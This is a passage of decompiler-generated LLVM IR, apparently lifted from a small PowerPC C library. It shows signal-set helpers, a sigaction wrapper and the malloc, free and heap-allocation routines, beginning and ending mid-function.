  %stack_var_-296 = alloca i32, align 4
  %v3_10010520 = icmp eq i32 %arg2, -1
  store i32 %arg1, i32* %r31.global-to-local, align 4
  br i1 %v3_10010520, label %dec_label_pc_1001054c, label %dec_label_pc_1001053c

dec_label_pc_1001053c:                            ; preds = %entry
  %tmp20 = icmp slt i32 %arg1, 1
  br i1 %tmp20, label %dec_label_pc_1001054c, label %dec_label_pc_10010544

dec_label_pc_10010544:                            ; preds = %dec_label_pc_1001053c
  %tmp21 = icmp slt i32 %arg1, 65
  br i1 %tmp21, label %dec_label_pc_1001057c.lr.ph, label %dec_label_pc_1001054c

dec_label_pc_1001054c:                            ; preds = %dec_label_pc_10010544, %dec_label_pc_1001053c, %entry
  %v0_1001054c = call i32 @__errno_location()
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_10010558 = inttoptr i32 %v0_1001054c to i32*
  store i32 22, i32* %v2_10010558, align 4
  %v0_100105ec.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100105e8

dec_label_pc_1001057c.lr.ph:                      ; preds = %dec_label_pc_10010544
  %v2_1001056c = ptrtoint i32* %stack_var_-296 to i32
  store i32 %v2_1001056c, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-296, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v2_1001057c22 = add i32 %v2_1001056c, 128
  %v3_1001057c23 = inttoptr i32 %v2_1001057c22 to i32*
  store i32 0, i32* %v3_1001057c23, align 4
  %v0_1001058024 = load i32, i32* %r11.global-to-local, align 4
  %v1_1001058025 = add i32 %v0_1001058024, -1
  store i32 %v1_1001058025, i32* %r11.global-to-local, align 4
  %v1_1001058426 = mul i32 %v1_1001058025, 4
  %v1_1001058827 = load i32, i32* %r8.global-to-local, align 4
  %v2_1001058828 = add i32 %v1_1001058827, %v1_1001058426
  store i32 %v2_1001058828, i32* %r9.global-to-local, align 4
  %v0_1001058c29 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001058c30 = add i32 %v0_1001058c29, -1
  store i32 %v1_1001058c30, i32* %ctr.global-to-local, align 4
  %v2_1001058c31 = icmp eq i32 %v1_1001058c30, 0
  br i1 %v2_1001058c31, label %dec_label_pc_10010590, label %dec_label_pc_1001057c.dec_label_pc_1001057c_crit_edge

dec_label_pc_1001057c.dec_label_pc_1001057c_crit_edge: ; preds = %dec_label_pc_1001057c.lr.ph, %dec_label_pc_1001057c.dec_label_pc_1001057c_crit_edge
  %v2_1001058832 = phi i32 [ %v2_10010588, %dec_label_pc_1001057c.dec_label_pc_1001057c_crit_edge ], [ %v2_1001058828, %dec_label_pc_1001057c.lr.ph ]
  %v0_1001057c.pre = load i32, i32* %r10.global-to-local, align 4
  %v2_1001057c = add i32 %v2_1001058832, 4
  %v3_1001057c = inttoptr i32 %v2_1001057c to i32*
  store i32 %v0_1001057c.pre, i32* %v3_1001057c, align 4
  %v0_10010580 = load i32, i32* %r11.global-to-local, align 4
  %v1_10010580 = add i32 %v0_10010580, -1
  store i32 %v1_10010580, i32* %r11.global-to-local, align 4
  %v1_10010584 = mul i32 %v1_10010580, 4
  %v1_10010588 = load i32, i32* %r8.global-to-local, align 4
  %v2_10010588 = add i32 %v1_10010588, %v1_10010584
  store i32 %v2_10010588, i32* %r9.global-to-local, align 4
  %v0_1001058c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001058c = add i32 %v0_1001058c, -1
  store i32 %v1_1001058c, i32* %ctr.global-to-local, align 4
  %v2_1001058c = icmp eq i32 %v1_1001058c, 0
  br i1 %v2_1001058c, label %dec_label_pc_10010590, label %dec_label_pc_1001057c.dec_label_pc_1001057c_crit_edge

dec_label_pc_10010590:                            ; preds = %dec_label_pc_1001057c.dec_label_pc_1001057c_crit_edge, %dec_label_pc_1001057c.lr.ph
  %v0_10010594.pre = load i32, i32* %r31.global-to-local, align 4
  %v2_10010590 = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v2_10010590, i32* @r3, align 4
  store i32 %v0_10010594.pre, i32* @r4, align 4
  %v0_10010598 = call i32 @__sigaddset()
  %v1_1001059c = icmp slt i32 %v0_10010598, 0
  br i1 %v1_1001059c, label %dec_label_pc_100105e4, label %dec_label_pc_100105a4

dec_label_pc_100105a4:                            ; preds = %dec_label_pc_10010590
  %v0_100105a8 = load i32, i32* %r31.global-to-local, align 4
  %v2_100105b0 = call i32 @__sigismember(i32 ptrtoint (i32* @global_var_10032ba0.1087 to i32), i32 %v0_100105a8)
  %v2_100105bc = ptrtoint i32* %stack_var_-156 to i32
  store i32 268502484, i32* @lr, align 4
  %v4_100105d0 = call i32 @__libc_sigaction(i32 %v0_100105a8, i32* nonnull %stack_var_-296, i32 %v2_100105bc)
  %v1_100105d4 = icmp slt i32 %v4_100105d0, 0
  br i1 %v1_100105d4, label %dec_label_pc_100105e4, label %dec_label_pc_100105dc

dec_label_pc_100105dc:                            ; preds = %dec_label_pc_100105a4
  %v3_100105dc = load i32, i32* %stack_var_-156, align 4
  store i32 %v3_100105dc, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100105e8

dec_label_pc_100105e4:                            ; preds = %dec_label_pc_100105a4, %dec_label_pc_10010590
  store i32 -1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100105e8

dec_label_pc_100105e8:                            ; preds = %dec_label_pc_100105dc, %dec_label_pc_1001054c, %dec_label_pc_100105e4
  %v0_100105ec = phi i32 [ %v3_100105dc, %dec_label_pc_100105dc ], [ %v0_100105ec.pre, %dec_label_pc_1001054c ], [ -1, %dec_label_pc_100105e4 ]
  ret i32 %v0_100105ec

; uselistorder directives
  uselistorder i32 %v1_1001058c, { 1, 0 }
  uselistorder i32 %v2_10010588, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 5, 3, 4 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r31.global-to-local, { 1, 0, 2 }
  uselistorder i32 65, { 2, 3, 0, 1 }
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100105e8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001057c.dec_label_pc_1001057c_crit_edge, { 1, 0 }
}

define i32 @__sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_10010600 = add i32 %arg2, -1
  %v1_10010604 = call i32 @__asm_rlwinm(i32 %v1_10010600, i32 29, i32 3, i32 29)
  %v1_10010608 = urem i32 %v1_10010600, 32
  %v2_1001060c = add i32 %v1_10010604, %arg1
  %v3_1001060c = inttoptr i32 %v2_1001060c to i32*
  %v4_1001060c = load i32, i32* %v3_1001060c, align 4
  %v3_10010614 = shl i32 1, %v1_10010608
  %v2_10010618 = and i32 %v4_1001060c, %v3_10010614
  %v2_1001061c = icmp ne i32 %v2_10010618, 0
  %v5_10010620 = zext i1 %v2_1001061c to i32
  ret i32 %v5_10010620
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %v0_10010628 = load i32, i32* @r4, align 4
  %v1_10010628 = add i32 %v0_10010628, -1
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_10010630 = call i32 @__asm_rlwinm(i32 %v1_10010628, i32 29, i32 3, i32 29)
  %v1_10010634 = urem i32 %v1_10010628, 32
  %v1_10010638 = load i32, i32* @r3, align 4
  %v2_10010638 = add i32 %v1_10010638, %v1_10010630
  %v3_10010638 = inttoptr i32 %v2_10010638 to i32*
  %v4_10010638 = load i32, i32* %v3_10010638, align 4
  %v0_1001063c = load i32, i32* %r0.global-to-local, align 4
  %v3_1001063c = shl i32 %v0_1001063c, %v1_10010634
  store i32 %v3_1001063c, i32* %r0.global-to-local, align 4
  %v2_10010640 = or i32 %v3_1001063c, %v4_10010638
  store i32 %v2_10010640, i32* %v3_10010638, align 4
  ret i32 0
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_10010650 = add i32 %arg2, -1
  %v1_10010658 = call i32 @__asm_rlwinm(i32 %v1_10010650, i32 29, i32 3, i32 29)
  %v1_1001065c = urem i32 %v1_10010650, 32
  %v2_10010660 = add i32 %v1_10010658, %arg1
  %v3_10010660 = inttoptr i32 %v2_10010660 to i32*
  %v4_10010660 = load i32, i32* %v3_10010660, align 4
  %v3_10010664 = shl i32 -2, %v1_1001065c
  %v4_10010664 = sub nsw i32 32, %v1_1001065c
  %v5_10010664 = lshr i32 -2, %v4_10010664
  %v6_10010664 = or i32 %v5_10010664, %v3_10010664
  %v2_10010668 = and i32 %v6_10010664, %v4_10010660
  store i32 %v2_10010668, i32* %v3_10010660, align 4
  ret i32 0
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_10010678 = load i32, i32* %r3.global-to-local, align 4
  %v3_10010678 = icmp eq i32 %v0_10010678, 0
  br i1 %v3_10010678, label %dec_label_pc_10010690, label %dec_label_pc_10010694

dec_label_pc_10010690:                            ; preds = %entry
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10010694

dec_label_pc_10010694:                            ; preds = %entry, %dec_label_pc_10010690
  %v0_100106a4 = phi i32 [ 1, %dec_label_pc_10010690 ], [ %v0_10010678, %entry ]
  %v3_10010698 = icmp ugt i32 %v0_100106a4, -8
  br i1 %v3_10010698, label %dec_label_pc_100107a8, label %dec_label_pc_100106a0

dec_label_pc_100106a0:                            ; preds = %dec_label_pc_10010694
  %v1_100106a4 = add i32 %v0_100106a4, 4
  store i32 ptrtoint (i32* @global_var_10032b70.1088 to i32), i32* @r29, align 4
  store i32 %v1_100106a4, i32* %stack_var_-40, align 4
  store i32 ptrtoint (i32* @global_var_10032b70.1088 to i32), i32* %r3.global-to-local, align 4
  %v0_100106b4 = call i32 @__pthread_return_0()
  %v2_100106bc = ptrtoint i32* %stack_var_-40 to i32
  store i32 add (i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32 -14128), i32* %r3.global-to-local, align 4
  %v3_100106c4 = call i32 @__heap_alloc(i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32 -14128) to i32*), i32 %v2_100106bc)
  store i32 %v3_100106c4, i32* %r31.global-to-local, align 4
  %v0_100106cc = load i32, i32* @r29, align 4
  store i32 %v0_100106cc, i32* %r3.global-to-local, align 4
  %v0_100106d0 = call i32 @__pthread_return_0()
  store i32 %v0_100106d0, i32* %r3.global-to-local, align 4
  %v3_100106d4 = icmp eq i32 %v3_100106c4, 0
  br i1 %v3_100106d4, label %dec_label_pc_100106dc, label %dec_label_pc_1001078c.thread

dec_label_pc_1001078c.thread:                     ; preds = %dec_label_pc_100106a0
  br label %dec_label_pc_100107a0

dec_label_pc_100106dc:                            ; preds = %dec_label_pc_100106a0
  %v3_100106e0 = load i32, i32* @global_var_1002c930.1091, align 4
  store i32 %v3_100106e0, i32* %r31.global-to-local, align 4
  %v3_100106e4 = load i32, i32* %stack_var_-40, align 4
  %v2_100106e8 = icmp ult i32 %v3_100106e4, %v3_100106e0
  br i1 %v2_100106e8, label %dec_label_pc_10010700, label %dec_label_pc_100106f0

dec_label_pc_100106f0:                            ; preds = %dec_label_pc_100106dc
  %v1_100106f4 = sub i32 0, %v3_100106e0
  %v2_100106f0 = add i32 %v3_100106e0, -1
  %v1_100106f8 = add i32 %v2_100106f0, %v3_100106e4
  %v2_100106fc = and i32 %v1_100106f8, %v1_100106f4
  store i32 %v2_100106fc, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10010700

dec_label_pc_10010700:                            ; preds = %dec_label_pc_100106dc, %dec_label_pc_100106f0
  store i32 ptrtoint (i32* @global_var_10032c20.1092 to i32), i32* %r3.global-to-local, align 4
  %v0_1001070c = call i32 @__pthread_return_0()
  %v0_10010710 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_10010710, i32* %r3.global-to-local, align 4
  store i32 268502808, i32* @lr, align 4
  %v1_10010714 = call i32 @__GI_sbrk(i32 %v0_10010710)
  store i32 %v1_10010714, i32* %r3.global-to-local, align 4
  %v3_10010718 = icmp eq i32 %v1_10010714, -1
  br i1 %v3_10010718, label %dec_label_pc_10010738, label %dec_label_pc_10010720

dec_label_pc_10010720:                            ; preds = %dec_label_pc_10010700
  %v1_10010720 = add i32 %v1_10010714, 3
  %v1_10010724 = call i32 @__asm_rlwinm(i32 %v1_10010720, i32 0, i32 0, i32 29)
  store i32 %v1_10010724, i32* @r30, align 4
  %v4_10010728 = icmp eq i32 %v1_10010724, %v1_10010714
  br i1 %v4_10010728, label %dec_label_pc_10010738, label %dec_label_pc_10010730

dec_label_pc_10010730:                            ; preds = %dec_label_pc_10010720
  %v2_10010730 = sub i32 %v1_10010724, %v1_10010714
  store i32 %v2_10010730, i32* %r3.global-to-local, align 4
  store i32 268502840, i32* @lr, align 4
  %v1_10010734 = call i32 @__GI_sbrk(i32 %v2_10010730)
  store i32 %v1_10010734, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10010738

dec_label_pc_10010738:                            ; preds = %dec_label_pc_10010720, %dec_label_pc_10010700, %dec_label_pc_10010730
  store i32 ptrtoint (i32* @global_var_10032c20.1092 to i32), i32* %r3.global-to-local, align 4
  %v0_10010740 = call i32 @__pthread_return_0()
  store i32 %v0_10010740, i32* %r3.global-to-local, align 4
  %v0_10010744 = load i32, i32* @r30, align 4
  %v3_10010744 = icmp eq i32 %v0_10010744, -1
  br i1 %v3_10010744, label %dec_label_pc_100107a8, label %dec_label_pc_1001078c

dec_label_pc_1001078c:                            ; preds = %dec_label_pc_10010738
  store i32 ptrtoint (i32* @global_var_10032b70.1088 to i32), i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_1002c8d0 to i32), i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_10032b70.1088 to i32), i32* %r3.global-to-local, align 4
  %v0_10010760 = call i32 @__pthread_return_0()
  %v0_10010764 = load i32, i32* @r31, align 4
  %v0_10010768 = load i32, i32* @r30, align 4
  %v0_1001076c = load i32, i32* @r29, align 4
  store i32 %v0_1001076c, i32* %r3.global-to-local, align 4
  store i32 268502900, i32* @lr, align 4
  %v3_10010770 = inttoptr i32 %v0_1001076c to i32*
  %v4_10010770 = call i32 @__heap_free(i32* %v3_10010770, i32 %v0_10010768, i32 %v0_10010764)
  %v0_10010774 = load i32, i32* @r29, align 4
  store i32 %v0_10010774, i32* %r3.global-to-local, align 4
  %v2_1001077c = inttoptr i32 %v0_10010774 to i32*
  %v3_1001077c = call i32 @__heap_alloc(i32* %v2_1001077c, i32 %v2_100106bc)
  store i32 %v3_1001077c, i32* %r31.global-to-local, align 4
  %v0_10010784 = load i32, i32* @r28, align 4
  store i32 %v0_10010784, i32* %r3.global-to-local, align 4
  %v0_10010788 = call i32 @__pthread_return_0()
  store i32 %v0_10010788, i32* %r3.global-to-local, align 4
  %v3_1001078c = icmp eq i32 %v3_1001077c, 0
  br i1 %v3_1001078c, label %dec_label_pc_100107a0.thread, label %dec_label_pc_100107a0

dec_label_pc_100107a0.thread:                     ; preds = %dec_label_pc_1001078c
  br label %dec_label_pc_100107a8

dec_label_pc_100107a0:                            ; preds = %dec_label_pc_1001078c, %dec_label_pc_1001078c.thread
  %v0_100107a0.pr6 = phi i32 [ %v3_100106c4, %dec_label_pc_1001078c.thread ], [ %v3_1001077c, %dec_label_pc_1001078c ]
  %v3_10010794 = load i32, i32* %stack_var_-40, align 4
  %v2_10010798 = inttoptr i32 %v0_100107a0.pr6 to i32*
  store i32 %v3_10010794, i32* %v2_10010798, align 4
  %v0_1001079c = load i32, i32* %r31.global-to-local, align 4
  %v1_1001079c = add i32 %v0_1001079c, 4
  store i32 %v1_1001079c, i32* @r31, align 4
  %v3_100107a0 = icmp eq i32 %v1_1001079c, 0
  br i1 %v3_100107a0, label %dec_label_pc_100107a8, label %dec_label_pc_100107b8

dec_label_pc_100107a8:                            ; preds = %dec_label_pc_100107a0.thread, %dec_label_pc_100107a0, %dec_label_pc_10010738, %dec_label_pc_10010694
  %v0_100107a8 = call i32 @__errno_location()
  store i32 %v0_100107a8, i32* %r3.global-to-local, align 4
  %v2_100107b0 = inttoptr i32 %v0_100107a8 to i32*
  store i32 12, i32* %v2_100107b0, align 4
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_100107b8

dec_label_pc_100107b8:                            ; preds = %dec_label_pc_100107a0, %dec_label_pc_100107a8
  %v0_100107bc = phi i32 [ %v1_1001079c, %dec_label_pc_100107a0 ], [ 0, %dec_label_pc_100107a8 ]
  store i32 %v0_100107bc, i32* %r3.global-to-local, align 4
  ret i32 %v0_100107bc

; uselistorder directives
  uselistorder i32 %v0_100107bc, { 1, 0 }
  uselistorder i32 %v1_1001079c, { 1, 0, 2 }
  uselistorder i32 %v1_10010724, { 1, 0, 2 }
  uselistorder i32 %v1_10010714, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v3_100106e0, { 1, 0, 2, 3 }
  uselistorder i32 %v3_100106c4, { 1, 0, 2 }
  uselistorder i32* %stack_var_-40, { 0, 1, 3, 2 }
  uselistorder i32* %r31.global-to-local, { 4, 0, 2, 1, 3, 5 }
  uselistorder i32* %r3.global-to-local, { 2, 15, 16, 3, 5, 4, 6, 17, 7, 18, 8, 19, 10, 9, 20, 11, 12, 13, 14, 0, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_10032b70.1088 to i32), { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_100107b8, { 1, 0 }
  uselistorder label %dec_label_pc_100107a8, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10010738, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10010700, { 1, 0 }
  uselistorder label %dec_label_pc_10010694, { 1, 0 }
}

define i32 @free(i32 %arg1) local_unnamed_addr {
entry:
  %v3_100107d0 = icmp eq i32 %arg1, 0
  br i1 %v3_100107d0, label %dec_label_pc_100108bc, label %dec_label_pc_100107e8

dec_label_pc_100107e8:                            ; preds = %entry
  %v1_100107ec = add i32 %arg1, -4
  %v2_100107ec = inttoptr i32 %v1_100107ec to i32*
  %v3_100107ec = load i32, i32* %v2_100107ec, align 4
  store i32 %v3_100107ec, i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* @r26, align 4
  %v0_10010800 = call i32 @__pthread_return_0()
  %v0_10010808 = load i32, i32* @r28, align 4
  store i32 268503060, i32* @lr, align 4
  %v4_10010810 = call i32 @__heap_free(i32* nonnull @global_var_1002c8d0, i32 %v1_100107ec, i32 %v0_10010808)
  %v3_10010818 = load i32, i32* @global_var_1002c930.1091, align 4
  store i32 %v4_10010810, i32* @r29, align 4
  %v1_10010820 = inttoptr i32 %v4_10010810 to i32*
  %v2_10010820 = load i32, i32* %v1_10010820, align 4
  store i32 %v2_10010820, i32* @r27, align 4
  %v1_10010824 = mul i32 %v3_10010818, 8
  %v2_10010828 = icmp ult i32 %v2_10010820, %v1_10010824
  br i1 %v2_10010828, label %dec_label_pc_1001085c, label %dec_label_pc_10010830

dec_label_pc_10010830:                            ; preds = %dec_label_pc_100107e8
  store i32 ptrtoint (i32* @global_var_10032c20.1092 to i32), i32* @r28, align 4
  %v0_10010840 = call i32 @__pthread_return_0()
  store i32 268503116, i32* @lr, align 4
  %v1_10010848 = call i32 @__GI_sbrk(i32 0)
  %v0_1001084c = load i32, i32* @r31, align 4
  %v4_1001084c = icmp eq i32 %v0_1001084c, %v1_10010848
  br i1 %v4_1001084c, label %dec_label_pc_10010864, label %dec_label_pc_10010854

dec_label_pc_10010854:                            ; preds = %dec_label_pc_10010830
  %v0_10010858 = call i32 @__pthread_return_0()
  br label %dec_label_pc_1001085c

dec_label_pc_1001085c:                            ; preds = %dec_label_pc_100107e8, %dec_label_pc_10010854
  br label %dec_label_pc_100108b8

dec_label_pc_10010864:                            ; preds = %dec_label_pc_10010830
  %v0_10010864 = load i32, i32* @r29, align 4
  %v1_10010864 = add i32 %v0_10010864, 4
  %v2_10010864 = inttoptr i32 %v1_10010864 to i32*
  %v3_10010864 = load i32, i32* %v2_10010864, align 4
  %v3_10010868 = icmp eq i32 %v3_10010864, 0
  br i1 %v3_10010868, label %dec_label_pc_10010878, label %dec_label_pc_10010870

dec_label_pc_10010870:                            ; preds = %dec_label_pc_10010864
  %v1_10010870 = add i32 %v0_10010864, 8
  %v2_10010870 = inttoptr i32 %v1_10010870 to i32*
  %v3_10010870 = load i32, i32* %v2_10010870, align 4
  %v2_10010874 = add i32 %v3_10010864, 8
  %v3_10010874 = inttoptr i32 %v2_10010874 to i32*
  store i32 %v3_10010870, i32* %v3_10010874, align 4
  %v0_10010878.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10010878

dec_label_pc_10010878:                            ; preds = %dec_label_pc_10010864, %dec_label_pc_10010870
  %v0_10010878 = phi i32 [ %v0_10010864, %dec_label_pc_10010864 ], [ %v0_10010878.pre, %dec_label_pc_10010870 ]
  %v1_10010878 = add i32 %v0_10010878, 8
  %v2_10010878 = inttoptr i32 %v1_10010878 to i32*
  %v3_10010878 = load i32, i32* %v2_10010878, align 4
  %v1_1001087c = add i32 %v0_10010878, 4
  %v2_1001087c = inttoptr i32 %v1_1001087c to i32*
  %v3_1001087c = load i32, i32* %v2_1001087c, align 4
  %v3_10010880 = icmp eq i32 %v3_10010878, 0
  br i1 %v3_10010880, label %dec_label_pc_10010890, label %dec_label_pc_10010888

dec_label_pc_10010888:                            ; preds = %dec_label_pc_10010878
  %v2_10010888 = add i32 %v3_10010878, 4
  %v3_10010888 = inttoptr i32 %v2_10010888 to i32*
  store i32 %v3_1001087c, i32* %v3_10010888, align 4
  br label %dec_label_pc_10010894

dec_label_pc_10010890:                            ; preds = %dec_label_pc_10010878
  store i32 %v3_1001087c, i32* @global_var_1002c8d0, align 4
  br label %dec_label_pc_10010894

dec_label_pc_10010894:                            ; preds = %dec_label_pc_10010888, %dec_label_pc_10010890
  %v0_1001089c = call i32 @__pthread_return_0()
  %v0_100108a0 = load i32, i32* @r27, align 4
  %v1_100108a0 = load i32, i32* @r29, align 4
  %v0_100108a8 = load i32, i32* @r31, align 4
  %v2_100108a0 = sub i32 12, %v0_100108a0
  %v1_100108a4 = add i32 %v2_100108a0, %v1_100108a0
  %v2_100108a8 = sub i32 %v1_100108a4, %v0_100108a8
  store i32 268503216, i32* @lr, align 4
  %v1_100108ac = call i32 @__GI_sbrk(i32 %v2_100108a8)
  br label %dec_label_pc_100108b8

dec_label_pc_100108b8:                            ; preds = %dec_label_pc_1001085c, %dec_label_pc_10010894
  %v0_100108b8 = call i32 @__pthread_return_0()
  br label %dec_label_pc_100108bc

dec_label_pc_100108bc:                            ; preds = %entry, %dec_label_pc_100108b8
  %v0_100108cc = phi i32 [ 0, %entry ], [ %v0_100108b8, %dec_label_pc_100108b8 ]
  ret i32 %v0_100108cc

; uselistorder directives
  uselistorder i32 %v0_10010878, { 1, 0 }
  uselistorder i32 (i32)* @__GI_sbrk, { 3, 2, 1, 0 }
  uselistorder i32* @global_var_1002c8d0, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_100108bc, { 1, 0 }
  uselistorder label %dec_label_pc_100108b8, { 1, 0 }
  uselistorder label %dec_label_pc_10010894, { 1, 0 }
  uselistorder label %dec_label_pc_10010878, { 1, 0 }
  uselistorder label %dec_label_pc_1001085c, { 1, 0 }
}

define i32 @__heap_alloc(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v1_100108d0 = inttoptr i32 %arg2 to i32*
  %v2_100108d0 = load i32, i32* %v1_100108d0, align 4
  %v1_100108d4 = add i32 %v2_100108d0, 3
  store i32 %v1_100108d4, i32* %r9.global-to-local, align 4
  %v1_100108d8 = call i32 @__asm_rlwinm(i32 %v1_100108d4, i32 0, i32 0, i32 29)
  %v2_100108dc = icmp ugt i32 %v1_100108d8, 11
  br i1 %v2_100108dc, label %dec_label_pc_10010960.preheader, label %dec_label_pc_100108e4

dec_label_pc_100108e4:                            ; preds = %entry
  br label %dec_label_pc_10010960.preheader

dec_label_pc_10010960.preheader:                  ; preds = %entry, %dec_label_pc_100108e4
  %storemerge20 = phi i32 [ 12, %dec_label_pc_100108e4 ], [ %v1_100108d8, %entry ]
  %v0_10010944 = phi i32 [ 12, %dec_label_pc_100108e4 ], [ %v1_100108d8, %entry ]
  store i32 %storemerge20, i32* %r11.global-to-local, align 4
  %storemerge2 = load i32, i32* %arg1, align 4
  store i32 %storemerge2, i32* %r9.global-to-local, align 4
  %v3_100109605 = icmp eq i32 %storemerge2, 0
  br i1 %v3_100109605, label %dec_label_pc_10010968, label %dec_label_pc_100108f0

dec_label_pc_100108f0:                            ; preds = %dec_label_pc_10010960.preheader, %dec_label_pc_1001095c
  %v0_1001095c = phi i32 [ %storemerge, %dec_label_pc_1001095c ], [ %storemerge2, %dec_label_pc_10010960.preheader ]
  %v1_100108f0 = inttoptr i32 %v0_1001095c to i32*
  %v2_100108f0 = load i32, i32* %v1_100108f0, align 4
  store i32 %v2_100108f0, i32* %r10.global-to-local, align 4
  %v2_100108f4 = icmp ult i32 %v2_100108f0, %v0_10010944
  br i1 %v2_100108f4, label %dec_label_pc_1001095c, label %dec_label_pc_100108fc

dec_label_pc_100108fc:                            ; preds = %dec_label_pc_100108f0
  %v1_100108fc = add i32 %v0_10010944, 44
  %v2_10010900 = icmp ult i32 %v2_100108f0, %v1_100108fc
  br i1 %v2_10010900, label %dec_label_pc_10010908, label %dec_label_pc_10010944

dec_label_pc_10010908:                            ; preds = %dec_label_pc_100108fc
  %v1_10010908 = add i32 %v0_1001095c, 4
  %v2_10010908 = inttoptr i32 %v1_10010908 to i32*
  %v3_10010908 = load i32, i32* %v2_10010908, align 4
  store i32 %v3_10010908, i32* %r11.global-to-local, align 4
  %v3_1001090c = icmp eq i32 %v3_10010908, 0
  br i1 %v3_1001090c, label %dec_label_pc_1001091c, label %dec_label_pc_10010914

dec_label_pc_10010914:                            ; preds = %dec_label_pc_10010908
  %v1_10010914 = add i32 %v0_1001095c, 8
  %v2_10010914 = inttoptr i32 %v1_10010914 to i32*
  %v3_10010914 = load i32, i32* %v2_10010914, align 4
  %v2_10010918 = add i32 %v3_10010908, 8
  %v3_10010918 = inttoptr i32 %v2_10010918 to i32*
  store i32 %v3_10010914, i32* %v3_10010918, align 4
  %v0_1001091c.pre = load i32, i32* %r9.global-to-local, align 4
  %v0_10010938.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1001091c

dec_label_pc_1001091c:                            ; preds = %dec_label_pc_10010908, %dec_label_pc_10010914
  %v0_10010938 = phi i32 [ %v2_100108f0, %dec_label_pc_10010908 ], [ %v0_10010938.pre, %dec_label_pc_10010914 ]
  %v0_1001091c = phi i32 [ %v0_1001095c, %dec_label_pc_10010908 ], [ %v0_1001091c.pre, %dec_label_pc_10010914 ]
  %v1_1001091c = add i32 %v0_1001091c, 8
  %v2_1001091c = inttoptr i32 %v1_1001091c to i32*
  %v3_1001091c = load i32, i32* %v2_1001091c, align 4
  %v1_10010920 = add i32 %v0_1001091c, 4
  %v2_10010920 = inttoptr i32 %v1_10010920 to i32*
  %v3_10010920 = load i32, i32* %v2_10010920, align 4
  %v3_10010924 = icmp eq i32 %v3_1001091c, 0
  store i32 %v0_10010938, i32* %r11.global-to-local, align 4
  br i1 %v3_10010924, label %dec_label_pc_10010938, label %dec_label_pc_1001092c

dec_label_pc_1001092c:                            ; preds = %dec_label_pc_1001091c
  %v2_10010930 = add i32 %v3_1001091c, 4
  %v3_10010930 = inttoptr i32 %v2_10010930 to i32*
  store i32 %v3_10010920, i32* %v3_10010930, align 4
  br label %dec_label_pc_1001094c

dec_label_pc_10010938:                            ; preds = %dec_label_pc_1001091c
  store i32 %v3_10010920, i32* %arg1, align 4
  br label %dec_label_pc_1001094c

dec_label_pc_10010944:                            ; preds = %dec_label_pc_100108fc
  %v2_10010944 = sub i32 %v2_100108f0, %v0_10010944
  store i32 %v2_10010944, i32* %v1_100108f0, align 4
  br label %dec_label_pc_1001094c

dec_label_pc_1001094c:                            ; preds = %dec_label_pc_10010938, %dec_label_pc_1001092c, %dec_label_pc_10010944
  %v0_1001094c = load i32, i32* %r10.global-to-local, align 4
  %v1_1001094c = load i32, i32* %r9.global-to-local, align 4
  %v2_1001094c = sub i32 %v1_1001094c, %v0_1001094c
  store i32 %v2_1001094c, i32* %r9.global-to-local, align 4
  %v0_10010950 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_10010950, i32* %v1_100108d0, align 4
  %v0_10010954 = load i32, i32* %r9.global-to-local, align 4
  %v1_10010954 = add i32 %v0_10010954, 12
  ret i32 %v1_10010954

dec_label_pc_1001095c:                            ; preds = %dec_label_pc_100108f0
  %v1_1001095c = add i32 %v0_1001095c, 4
  %storemerge.in = inttoptr i32 %v1_1001095c to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v3_10010960 = icmp eq i32 %storemerge, 0
  br i1 %v3_10010960, label %dec_label_pc_10010960.dec_label_pc_10010968_crit_edge, label %dec_label_pc_100108f0

dec_label_pc_10010960.dec_label_pc_10010968_crit_edge: ; preds = %dec_label_pc_1001095c
  br label %dec_label_pc_10010968

